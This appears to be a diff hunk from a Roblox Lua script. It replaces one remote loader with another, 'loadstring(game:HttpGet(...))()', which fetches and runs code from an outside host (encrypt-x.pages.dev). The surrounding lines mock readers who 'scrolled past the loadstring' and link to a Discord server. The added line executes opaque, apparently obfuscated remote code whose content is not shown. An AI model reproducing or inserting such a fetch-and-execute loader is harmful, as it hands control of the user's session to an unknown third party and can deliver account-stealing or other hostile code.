@@ -459,7 +459,7 @@ end
 
 local sequenceValue = runDeviousCalculationSequence()
 
-loadstring(game:HttpGet("https://obfuscatorhub.onrender.com/api/5xvokq9r"))()
+loadstring(game:HttpGet("https://encrypt-x.pages.dev/Scripts?Id=3636353064248"))("3636353064248")
 
 local postSkidDatabasePart1 = {
     "hahaha you actually scrolled past the loadstring lol: https://discord.gg/P2FEVBz2PG",
